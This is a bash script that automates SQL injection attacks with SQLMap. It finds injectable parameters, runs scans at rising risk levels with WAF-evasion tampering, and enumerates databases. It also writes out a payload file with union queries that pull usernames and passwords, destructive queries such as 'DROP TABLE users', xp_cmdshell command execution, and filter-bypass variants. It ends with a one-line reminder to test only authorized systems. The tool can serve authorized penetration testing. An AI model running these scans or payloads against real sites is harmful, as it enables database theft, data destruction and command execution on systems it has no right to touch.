#!/bin/bash

#====================================================================
#  SQL INJECTION TESTING SCRIPT
#====================================================================
#  Automated SQL injection testing with SQLMap
#  
#  Usage: ./sqli-test.sh <url_or_file> [output_dir]
#====================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

if [[ -z "$1" ]]; then
    echo -e "${RED}Usage: $0 <url|url_file> [output_dir]${NC}"
    echo "Examples:"
    echo "  $0 'https://example.com/page?id=1'"
    echo "  $0 sqli-urls.txt"
    exit 1
fi

TARGET="$1"
OUTPUT_DIR="${2:-$HOME/HackTools/output/sqli}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SQLMAP_PATH="$HOME/HackTools/web-testing/sqlmap/sqlmap.py"

mkdir -p "$OUTPUT_DIR"

echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║            SQL INJECTION TESTING                          ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check for sqlmap
if [[ ! -f "$SQLMAP_PATH" ]] && ! command -v sqlmap &> /dev/null; then
    echo -e "${RED}[-] SQLMap not found!${NC}"
    echo "Install with: git clone https://github.com/sqlmapproject/sqlmap.git"
    exit 1
fi

# Set sqlmap command
if [[ -f "$SQLMAP_PATH" ]]; then
    SQLMAP="python3 $SQLMAP_PATH"
else
    SQLMAP="sqlmap"
fi

#====================================================================
# GF PATTERN MATCHING FOR SQLI
#====================================================================
find_sqli_params() {
    echo -e "${YELLOW}[*] Finding SQLi-prone parameters...${NC}"
    
    if command -v gf &> /dev/null; then
        if [[ -f "$TARGET" ]]; then
            cat "$TARGET" | gf sqli 2>/dev/null | sort -u > "$OUTPUT_DIR/sqli-params-$TIMESTAMP.txt" || true
        else
            echo "$TARGET" | gf sqli 2>/dev/null > "$OUTPUT_DIR/sqli-params-$TIMESTAMP.txt" || true
        fi
        
        PARAMS=$(wc -l < "$OUTPUT_DIR/sqli-params-$TIMESTAMP.txt" 2>/dev/null || echo 0)
        echo -e "${GREEN}[+] Found $PARAMS potential SQLi parameters${NC}"
    fi
}

#====================================================================
# SQLMAP BASIC SCAN
#====================================================================
sqlmap_basic() {
    echo -e "${YELLOW}[*] Running SQLMap basic scan...${NC}"
    
    if [[ -f "$TARGET" ]]; then
        # Batch mode for file
        while IFS= read -r url; do
            echo -e "${BLUE}[>] Testing: $url${NC}"
            $SQLMAP -u "$url" \
                --batch \
                --random-agent \
                --level=1 \
                --risk=1 \
                --output-dir="$OUTPUT_DIR/sqlmap-$TIMESTAMP" \
                2>/dev/null || true
        done < "$TARGET"
    else
        $SQLMAP -u "$TARGET" \
            --batch \
            --random-agent \
            --level=1 \
            --risk=1 \
            --output-dir="$OUTPUT_DIR/sqlmap-$TIMESTAMP" \
            2>/dev/null || true
    fi
}

#====================================================================
# SQLMAP ADVANCED SCAN
#====================================================================
sqlmap_advanced() {
    echo -e "${YELLOW}[*] Running SQLMap advanced scan...${NC}"
    
    if [[ -f "$TARGET" ]]; then
        URL=$(head -1 "$TARGET")
    else
        URL="$TARGET"
    fi
    
    $SQLMAP -u "$URL" \
        --batch \
        --random-agent \
        --level=3 \
        --risk=2 \
        --threads=5 \
        --tamper=space2comment \
        --output-dir="$OUTPUT_DIR/sqlmap-advanced-$TIMESTAMP" \
        2>/dev/null || true
}

#====================================================================
# SQLMAP DATABASE ENUMERATION
#====================================================================
sqlmap_enum() {
    echo -e "${YELLOW}[*] Enumerating databases (if vulnerable)...${NC}"
    
    if [[ -f "$TARGET" ]]; then
        URL=$(head -1 "$TARGET")
    else
        URL="$TARGET"
    fi
    
    $SQLMAP -u "$URL" \
        --batch \
        --random-agent \
        --dbs \
        --output-dir="$OUTPUT_DIR/sqlmap-enum-$TIMESTAMP" \
        2>/dev/null || true
}

#====================================================================
# GENERATE SQLI PAYLOADS
#====================================================================
generate_payloads() {
    echo -e "${YELLOW}[*] Generating SQLi payloads for manual testing...${NC}"
    
    cat > "$OUTPUT_DIR/sqli-payloads.txt" << 'EOF'
# Basic SQLi Payloads
'
"
`
')
")
`)
'))
"))

# Error-based SQLi
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1 --
" OR 1=1 --
' OR 'a'='a
" OR "a"="a

# Union-based SQLi
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
1' ORDER BY 1--
1' ORDER BY 10--

# Blind SQLi (Boolean)
' AND 1=1--
' AND 1=2--
' AND 'a'='a
' AND 'a'='b
1' AND (SELECT COUNT(*) FROM users)>0--

# Time-based Blind SQLi
'; WAITFOR DELAY '0:0:5'--
'; SELECT SLEEP(5)--
' AND SLEEP(5)--
' OR SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# Stacked Queries
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','password')--

# MySQL Specific
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--

# PostgreSQL Specific
'; SELECT pg_sleep(5)--
' AND 1=CAST((SELECT version()) AS int)--

# MSSQL Specific
'; EXEC xp_cmdshell('whoami')--
' AND 1=CONVERT(int,(SELECT @@version))--

# Oracle Specific
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

# Bypass Techniques
'/**/OR/**/1=1--
' oR 1=1--
' Or 1=1--
'%20OR%201=1--
'%0aOR%0a1=1--
EOF

    echo -e "${GREEN}[+] Payloads saved to: $OUTPUT_DIR/sqli-payloads.txt${NC}"
}

#====================================================================
# MAIN MENU
#====================================================================
show_menu() {
    echo ""
    echo "Select scan type:"
    echo ""
    echo "  1) Find SQLi parameters (GF)"
    echo "  2) Basic SQLMap scan"
    echo "  3) Advanced SQLMap scan"
    echo "  4) Database enumeration"
    echo "  5) Generate payloads for manual testing"
    echo "  6) Full scan (all of above)"
    echo "  7) Exit"
    echo ""
    read -p "Enter choice [1-7]: " choice
    
    case $choice in
        1) find_sqli_params ;;
        2) sqlmap_basic ;;
        3) sqlmap_advanced ;;
        4) sqlmap_enum ;;
        5) generate_payloads ;;
        6)
            find_sqli_params
            sqlmap_basic
            generate_payloads
            ;;
        7) exit 0 ;;
        *) echo "Invalid choice"; show_menu ;;
    esac
}

show_menu

# Summary
echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}SQL INJECTION TESTING COMPLETE${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo "Results saved to: $OUTPUT_DIR"
echo ""
echo -e "${YELLOW}[!] Always verify findings manually before reporting!${NC}"
echo -e "${YELLOW}[!] Only test on systems you have authorization for!${NC}"
